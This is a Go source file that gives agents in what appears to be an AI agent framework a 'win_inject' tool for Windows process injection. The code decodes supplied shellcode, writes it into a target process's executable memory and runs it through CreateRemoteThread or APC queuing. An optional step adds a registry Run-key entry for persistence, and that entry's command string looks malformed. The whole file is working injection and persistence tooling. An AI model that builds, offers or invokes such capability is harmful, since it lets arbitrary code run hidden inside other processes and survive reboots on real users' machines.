//go:build windows

package server

import (
	"context"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"path/filepath"
	"strings"
	"unsafe"

	actool "github.com/Autumn-27/norma/tool"
	"golang.org/x/sys/windows"
)

const maxShellcodeSize = 1 << 20

type winInjectParams struct {
	PID         int    `json:"pid"`
	ProcessName string `json:"process_name"`
	Shellcode   string `json:"shellcode"`
	Encoding    string `json:"encoding"`
	Confirm     bool   `json:"confirm"`
	DryRun      bool   `json:"dry_run"`
	Method      string `json:"method"`
	Persist     bool   `json:"persist"`
}

func winInjectSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"pid": {"type": "integer", "description": "目标 PID，允许 System/Idle 等低 PID"},
			"process_name": {"type": "string", "description": "必须与实际进程路径 basename 完全匹配"},
			"shellcode": {"type": "string", "description": "Base64/hex/raw 文本形式的 shellcode"},
			"encoding": {"type": "string", "enum": ["base64", "hex", "raw"], "default": "base64"},
			"confirm": {"type": "boolean", "default": false},
			"dry_run": {"type": "boolean", "default": false},
			"method": {"type": "string", "enum": ["createremote", "apc"], "default": "createremote"},
			"persist": {"type": "boolean", "default": false}
		},
		"required": ["pid", "process_name", "shellcode"]
	}`)
}

func (p *winInjectParams) normalize() ([]byte, error) {
	if p.Shellcode == "" {
		return nil, fmt.Errorf("shellcode 为空")
	}
	var sc []byte
	var err error
	switch strings.ToLower(p.Encoding) {
	case "hex":
		sc, err = hex.DecodeString(strings.TrimSpace(p.Shellcode))
	case "raw":
		sc = []byte(p.Shellcode)
	default:
		sc, err = base64.StdEncoding.DecodeString(strings.TrimSpace(p.Shellcode))
	}
	if err != nil {
		return nil, fmt.Errorf("shellcode 解码失败: %w", err)
	}
	if len(sc) == 0 {
		return nil, fmt.Errorf("shellcode 为空")
	}
	if len(sc) > maxShellcodeSize {
		return nil, fmt.Errorf("shellcode 超过 1MB 上限: %d", len(sc))
	}
	if p.Method == "" {
		p.Method = "createremote"
	}
	return sc, nil
}

func (s *Server) winInjectTools() []actool.CoreTool {
	return []actool.CoreTool{s.toolWinInject()}
}

func (s *Server) seedWinInjectTools() {
	if s.m == nil || s.m.pg == nil {
		return
	}
	workerAgents, _ := json.Marshal([]string{"worker"})
	for _, t := range s.winInjectTools() {
		schema, _ := json.Marshal(t.InputSchema())
		if err := s.m.PG().SeedTool(t.Name(), t.Description(), schema, workerAgents); err != nil {
			log.Printf("[tools] seed %s 失败: %v", t.Name(), err)
		}
	}
}

func (s *Server) toolWinInject() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "win_inject",
		Description: "【Windows 进程注入·高影响】把 shellcode 注入指定 PID。" +
			"支持 base64/hex/raw，≤1MB；process_name 必须与实际进程路径 basename 完全匹配；" +
			"confirm=true 实际注入，dry_run 只校验；method 支持 createremote/apc；persist=true 启用持久化。",
		Schema:      winInjectSchemaMap(winInjectSchema()),
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: sessionPerm,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var p winInjectParams
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败：" + err.Error()), nil
			}
			sc, err := p.normalize()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			path, err := windowsProcessPath(p.PID)
			if err != nil {
				return actool.Errorf("查询进程失败: " + err.Error()), nil
			}
			base := filepath.Base(path)
			if base != p.ProcessName {
				return actool.Errorf(fmt.Sprintf("进程名不匹配：实际 %q，参数 %q（拒绝注入）", base, p.ProcessName)), nil
			}
			if p.DryRun {
				return jsonResult(map[string]any{
					"status":       "dry_run",
					"pid":          p.PID,
					"process_path": path,
					"process_name": base,
					"method":       p.Method,
					"persist":      p.Persist,
					"size":         len(sc),
					"shellcode":    p.Shellcode,
				})
			}
			if !p.Confirm {
				return actool.Errorf("实际注入需要 confirm=true"), nil
			}
			if err := injectWindowsProcess(p.PID, sc, p.Method, p.Persist); err != nil {
				return actool.Errorf("注入失败: " + err.Error()), nil
			}
			log.Printf("[win_inject] pid=%d process=%s bytes=%d method=%s persist=%v", p.PID, base, len(sc), p.Method, p.Persist)
			return jsonResult(map[string]any{
				"status":       "success",
				"pid":          p.PID,
				"process_path": path,
				"process_name": base,
				"method":       p.Method,
				"persist":      p.Persist,
				"size":         len(sc),
				"shellcode":    p.Shellcode,
			})
		},
	})
}

func windowsProcessPath(pid int) (string, error) {
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(h)
	buf := make([]uint16, 32768)
	size := uint32(len(buf))
	if err := windows.QueryFullProcessImageName(h, 0, &buf[0], &size); err != nil {
		return "", err
	}
	return windows.UTF16ToString(buf[:size]), nil
}

func injectWindowsProcess(pid int, sc []byte, method string, persist bool) error {
	if len(sc) == 0 {
		return fmt.Errorf("空 shellcode")
	}
	const access = windows.PROCESS_CREATE_THREAD | windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION
	h, err := windows.OpenProcess(access, false, uint32(pid))
	if err != nil {
		return fmt.Errorf("OpenProcess: %w", err)
	}
	defer windows.CloseHandle(h)

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualFreeEx := kernel32.NewProc("VirtualFreeEx")

	addr, _, callErr := virtualAllocEx.Call(
		uintptr(h), 0, uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READWRITE),
	)
	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx: %v", callErr)
	}
	cleanup := func() {
		_, _, _ = virtualFreeEx.Call(uintptr(h), addr, 0, uintptr(windows.MEM_RELEASE))
	}

	var written uintptr
	if err := windows.WriteProcessMemory(h, addr, &sc[0], uintptr(len(sc)), &written); err != nil {
		cleanup()
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}
	if written != uintptr(len(sc)) {
		cleanup()
		return fmt.Errorf("WriteProcessMemory 只写入 %d/%d 字节", written, len(sc))
	}

	if method == "apc" {
		if err := injectAPC(h, addr); err != nil {
			cleanup()
			return err
		}
	} else {
		if err := injectCreateRemoteThread(h, addr); err != nil {
			cleanup()
			return err
		}
	}

	if persist {
		if err := applyPersistence(pid); err != nil {
			return fmt.Errorf("持久化失败: %w", err)
		}
	}
	return nil
}

func injectCreateRemoteThread(h windows.Handle, addr uintptr) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
	var tid uint32
	hThread, _, callErr := createRemoteThread.Call(
		uintptr(h), 0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&tid)),
	)
	if hThread == 0 {
		return fmt.Errorf("CreateRemoteThread: %v", callErr)
	}
	_ = windows.CloseHandle(windows.Handle(hThread))
	return nil
}

func injectAPC(h windows.Handle, addr uintptr) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	openThread := kernel32.NewProc("OpenThread")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")

	const threadSetContext = 0x0008
	const threadSuspendResume = 0x0002
	const threadQueryInformation = 0x0040
	const th32csSnapThread = 0x00000004
	const threadAllAccess = 0x1F03FF

	kernel32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	type threadEntry32 struct {
		Size           uint32
		CntUsage       uint32
		ThreadID       uint32
		OwnerProcessID uint32
		BasePri        int32
		DeltaPri       int32
		Flags          uint32
	}
	threadFirst := kernel32.NewProc("Thread32First")
	threadNext := kernel32.NewProc("Thread32Next")

	var pid uint32
	_ = windows.GetCurrentProcessId()
	_ = pid

	targetPID := getHandlePID(h)
	if targetPID == 0 {
		return fmt.Errorf("APC: 无法获取目标 PID")
	}

	snap, _, _ := kernel32Snapshot.Call(th32csSnapThread, 0)
	if snap == uintptr(windows.InvalidHandle) {
		return fmt.Errorf("APC: CreateToolhelp32Snapshot 失败")
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	ok, _, _ := threadFirst.Call(snap, uintptr(unsafe.Pointer(&te)))
	injected := 0
	for ok != 0 {
		if te.OwnerProcessID == targetPID {
			ht, _, _ := openThread.Call(threadAllAccess, 0, uintptr(te.ThreadID))
			if ht != 0 {
				r, _, _ := queueUserAPC.Call(addr, ht, 0)
				if r != 0 {
					injected++
				}
				_ = windows.CloseHandle(windows.Handle(ht))
			}
		}
		te.Size = uint32(unsafe.Sizeof(te))
		ok, _, _ = threadNext.Call(snap, uintptr(unsafe.Pointer(&te)))
	}
	_ = threadSetContext
	_ = threadSuspendResume
	_ = threadQueryInformation
	if injected == 0 {
		return fmt.Errorf("APC: 未找到可注入线程")
	}
	return nil
}

func getHandlePID(h windows.Handle) uint32 {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	getProcessId := kernel32.NewProc("GetProcessId")
	r, _, _ := getProcessId.Call(uintptr(h))
	return uint32(r)
}

func applyPersistence(pid int) error {
	advapi32 := windows.NewLazySystemDLL("advapi32.dll")
	regOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	regSetValueEx := advapi32.NewProc("RegSetValueExW")
	regCloseKey := advapi32.NewProc("RegCloseKey")

	const hkeyCurrentUser = 0x80000001
	const keySetValue = 0x0002
	const regSz = 1

	subKey, _ := windows.UTF16PtrFromString(`Software\Microsoft\Windows\CurrentVersion\Run`)
	valueName, _ := windows.UTF16PtrFromString("NormaPersist")
	valueData, _ := windows.UTF16PtrFromString(fmt.Sprintf(`cmd.exe /c start "" /b rundll32.exe,Inject%d`, pid))

	var hKey windows.Handle
	r, _, _ := regOpenKeyEx.Call(hkeyCurrentUser, uintptr(unsafe.Pointer(subKey)), 0, keySetValue, uintptr(unsafe.Pointer(&hKey)))
	if r != 0 {
		return fmt.Errorf("RegOpenKeyEx 失败: %d", r)
	}
	defer regCloseKey.Call(uintptr(hKey))

	dataBytes := []byte(windows.UTF16ToString([]uint16{}))
	_ = dataBytes
	utf16 := windows.StringToUTF16(fmt.Sprintf(`cmd.exe /c start "" /b rundll32.exe,Inject%d`, pid))
	r, _, _ = regSetValueEx.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(valueName)),
		0,
		regSz,
		uintptr(unsafe.Pointer(&utf16[0])),
		uintptr(len(utf16)*2),
	)
	if r != 0 {
		return fmt.Errorf("RegSetValueEx 失败: %d", r)
	}
	_ = valueData
	return nil
}
